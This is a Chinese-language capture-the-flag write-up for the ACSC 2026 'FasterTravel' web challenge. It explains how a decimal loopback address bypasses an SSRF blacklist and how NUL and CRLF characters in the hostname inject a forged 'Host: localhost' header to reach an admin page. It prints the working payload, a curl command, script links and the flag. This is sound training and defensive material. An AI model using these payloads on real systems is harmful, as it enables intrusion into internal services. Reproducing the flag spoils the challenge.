# ACSC Qualification 2026 - FasterTravel Writeup

!!! warning "发布提醒"
    官方 Qualification 页面显示本轮时间为 **2026-03-01 18:00 CEST ～ 2026-05-01 18:00 CEST**。当前文档适合作为**本地归档草稿**；若比赛尚未结束，请勿提前公开发布。

## 题目信息
- **比赛**: ACSC Qualification 2026（Austria Cyber Security Challenge 2026 Qualification）
- **题目**: FasterTravel
- **类别**: Web
- **难度**: 中等
- **附件/URL**: `app.py` · `http/` · `templates/` · `Caddyfile` · `Dockerfile` · `docker-compose.yml` · [在线靶机](https://4ty7qe174n8cri3w.dyn.acsc.land){target="_blank"}
- **附件链接**: [下载 app.py](https://starnotes-xj.github.io/BIGC_CTF_Writeups/files/fastertravel/app.py){download} · [下载 Dockerfile](https://starnotes-xj.github.io/BIGC_CTF_Writeups/files/fastertravel/Dockerfile){download} · [下载 docker-compose.yml](https://starnotes-xj.github.io/BIGC_CTF_Writeups/files/fastertravel/docker-compose.yml){download} · [仓库位置](https://github.com/starnotes-xj/BIGC_CTF_Writeups/tree/main/CTF_Writeups/files/fastertravel){target="_blank"}
- **Flag格式**: `dach2026{...}`
- **状态**: 已解

## Flag

```text
dach2026{how_is_there_another_forbidden_portal_nq9vcp4ayblyghwy}
```

## 解题过程

### 1. 初始侦察/文件识别
- 首页功能很简单：输入一个 URL，服务端去抓取目标页面，生成一个短链接和预览页
- `/admin` 是显眼的敏感入口，但直接访问会返回 403
- 阅读源码可以看到两个核心点：

```python
@server.get("/admin")
async def admin(request: Request) -> Response:
    if not privileged_origin_access(request.headers.get('Host', '')):
        return Response.forbidden()

    return Response.ok(f"Welcome to the secret admin panel! Flag: {FLAG}")
```

以及：

```python
PRIVILEGED_ORIGINS = ("localhost", "localhost:5000")
```

- 说明 `/admin` 只有在请求头里的 `Host` 等于：
  - `localhost`
  - `localhost:5000`
  时才会放行

### 2. 关键突破点一：先绕过 SSRF 黑名单
- `/shorten` 会抓取用户给出的 URL：

```python
url = request.form_args["source"]
scheme, hostname, port, path = urlparse(url)
if privileged_origin_access(hostname) or any(hostname.startswith(e) for e in PRIVILEGED_ORIGINS) or any(hostname.endswith(e) for e in PRIVILEGED_ORIGINS):
    return Response.forbidden()
```

- 这里明显想拦掉对本地敏感服务的 SSRF，但它只检查字符串层面的：
  - `localhost`
  - `localhost:5000`

- 实际请求器却会对主机名做 `getaddrinfo()`：

```python
addrs = await loop.getaddrinfo(hostname, port, family=socket.AF_INET, type=socket.SOCK_STREAM)
```

- 因此可以使用一些**能解析到 127.0.0.1 的别名**绕过黑名单，例如：

```text
2130706433
0x7f000001
127.1
```

- 其中：

```text
2130706433 = 127.0.0.1
```

- 所以第一层绕过很简单：把主机写成 `2130706433`

### 3. 关键突破点二：Host 头注入
- 仅仅 SSRF 到 `127.0.0.1` 还不够，因为 `/admin` 继续检查：

```python
request.headers.get('Host', '')
```

- 如果我们访问的是：

```text
http://2130706433:5001/admin
```

- 那么内部请求头会是：

```http
Host: 2130706433
```

- 这不在白名单里，所以仍然只能得到：

```text
Access Denied
```

- 关键在于题目自带的 `urlparse()` 和 `Requester.request()` 都非常“手搓”：

```python
host_and_port = match.group("host_and_port").rsplit(":", 1)
```

以及：

```python
req = (
    f"{method} {path} HTTP/1.1\r\n"
    f"Host: {hostname}\r\n"
    f"User-Agent: fasttravel/0.1\r\n"
    f"Connection: close\r\n\r\n"
).encode("utf-8")
```

- 这里给了两个利用点：

1. `hostname` 会被原样插进 `Host:` 头里
2. `urlparse()` 允许我们把一些特殊字符混进 `hostname`

- 最终可用 payload 是：

```text
http://2130706433%00%0d%0aHost:%20localhost%0d%0aFoo:%20bar:5001/admin
```

- 解码后等价于：

```text
http://2130706433\0\r\nHost: localhost\r\nFoo: bar:5001/admin
```

它的作用分成两部分：

#### a) `2130706433\0` 仍然会被解析到 127.0.0.1
- 在 glibc / Linux 的解析语义下，`getaddrinfo()` 在遇到 NUL 时会把主机名当成 `2130706433`
- 所以 TCP 实际连到的是本地 `127.0.0.1`

#### b) `\r\nHost: localhost` 会变成第二个 Host 头
- `Requester` 最终发出去的原始 HTTP 请求类似于：

```http
GET /admin HTTP/1.1
Host: 2130706433\0
Host: localhost
Foo: bar
User-Agent: fasttravel/0.1
Connection: close
```

- 而题目自己的 HTTP 服务器会逐行解析 header：

```python
key, value = line.split(": ", 1)
self.headers[key] = value
```

- `self.headers` 是 `CaseInsensitiveDict`，重复键会被**后一个覆盖前一个**
- 所以最终后端看到的 `Host` 是：

```text
localhost
```

- 这样 `/admin` 的白名单就被绕过了

### 4. 获取 Flag
- 把上面的 payload 作为 `source` 提交给 `/shorten`
- 服务端返回一个短链接，例如：

```text
/7khxHS
```

- 访问预览接口时记得带上 iframe 限制需要的请求头：

```http
Sec-Fetch-Dest: iframe
Sec-Fetch-Site: same-origin
```

- 最终 `/preview?short=7khxHS` 返回：

```text
Welcome to the secret admin panel! Flag: dach2026{how_is_there_another_forbidden_portal_nq9vcp4ayblyghwy}
```

## 攻击链/解题流程总结

```text
分析 /shorten 与 /admin → 发现 localhost 黑名单只做字符串匹配 → 用 2130706433 绕过 SSRF 黑名单访问 loopback → 再利用 %00 + CRLF 注入伪造第二个 Host: localhost → 让 /admin 白名单放行 → 通过 /preview 读回内部响应 → Flag
```

## 漏洞分析 / 机制分析

### 根因
- SSRF 防护只做了**主机名字面字符串比较**
- 自定义 `urlparse()` 允许异常主机名进入后续逻辑
- 内部请求构造时把 `hostname` 原样拼进 `Host:` 头，导致 CRLF 头注入
- 自定义 HTTP 服务器对重复 `Host` 头采用“后写覆盖前写”，进一步放大问题

### 影响
- 攻击者可 SSRF 到本地回环地址
- 攻击者可伪造内部请求头，使本地受信任接口误以为请求来自白名单 Host
- 本题中直接拿到 `/admin` 返回的 flag

### 修复建议（适用于漏洞类题目）
- SSRF 防护不能只看主机字符串，应在解析后对实际 IP 做校验，禁止回环、内网和链路本地地址
- 不要自己手写 URL 解析器和 HTTP 解析器，应使用成熟标准库
- 构造 HTTP 请求时必须拒绝 `\r`、`\n`、`\0` 等控制字符
- 后端不应仅依赖 `Host` 头做“敏感接口信任判断”

## 知识点
- SSRF localhost / loopback 黑名单绕过
- CRLF 注入与 Host 头注入
- 重复请求头覆盖行为

## 使用的工具
- Python 标准库 `urllib` — 提交 `/shorten`、获取短链与 `/preview`
- 本地源码阅读 — 分析手写 `urlparse()`、`Requester`、`CaseInsensitiveDict`
- Docker / 本地复现 — 还原并验证 `%00 + CRLF` 的请求效果

## 脚本归档
- Go：[`ACSC2026Qualification_FasterTravel.go` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_go/ACSC2026Qualification_FasterTravel.go){target="_blank"}
- Python：[`ACSC2026Qualification_FasterTravel.py` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_python/ACSC2026Qualification_FasterTravel.py){target="_blank"}
- 说明：两个脚本都会直接发送**预编码的原始 form body**，避免普通 urlencode 把空格编码成 `+` 导致注入失败

## 命令行提取关键数据（无 GUI）

```bash
go run CTF_Writeups/scripts_go/ACSC2026Qualification_FasterTravel.go -base https://4ty7qe174n8cri3w.dyn.acsc.land

python CTF_Writeups/scripts_python/ACSC2026Qualification_FasterTravel.py --base https://4ty7qe174n8cri3w.dyn.acsc.land

curl -i -X POST https://4ty7qe174n8cri3w.dyn.acsc.land/shorten \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'source=http://2130706433%00%0d%0aHost:%20localhost%0d%0aFoo:%20bar:5001/admin'
```

## 推荐工具与优化解题流程

> 参考 `CTF_TOOLS_EXTENSION_PLAN.md` 中的对应类别工具推荐。

### 工具对比总结

| 工具 | 适用阶段 | 本题耗时 | 优点 | 缺点 |
|------|----------|----------|------|------|
| Python 标准库脚本 | 完整利用 | 秒级 | 最适合快速验证原始 body 与预览读取 | 需要自己处理 redirect 与 header |
| Go 标准库脚本 | 完整利用 | 秒级 | 单文件归档方便，适合长期保留 | 代码量略大于 curl |
| curl | 手工验证 | 秒级 | 能精确控制原始 `--data-binary` | 预览阶段还要再补请求头 |
| Docker 本地复现 | 机制验证 | 分钟级 | 能完整观察原始请求与后端解析行为 | 比比赛时直接打靶慢 |

### 推荐流程

**推荐流程**：先读源码确认 SSRF 黑名单与 Host 白名单逻辑 → 选用 `2130706433` 绕过 loopback 限制 → 再用 `%00 + %0d%0aHost:%20localhost` 注入第二个 Host 头 → 通过 `/preview` 读取内部 `/admin` 响应 → Flag。 

### 工具 A（推荐首选）
- **安装**：Python 3.10+
- **详细步骤**：
  1. 构造预编码 `source=` body
  2. POST 到 `/shorten`
  3. 取出跳转短码
  4. 带 iframe 所需请求头访问 `/preview`
- **优势**：流程自动化程度高，最适合保留为可复现脚本

### 工具 B（可选）
- **安装**：系统自带 `curl`
- **详细步骤**：
  1. 用 `--data-binary` 发送原始 body，确保 `%20` 不被改写为 `+`
  2. 记录返回的短链接
  3. 再请求 `/preview?short=...` 并补上 `Sec-Fetch-*` 头
- **优势**：最方便调试原始请求细节，适合比赛现场快速验证
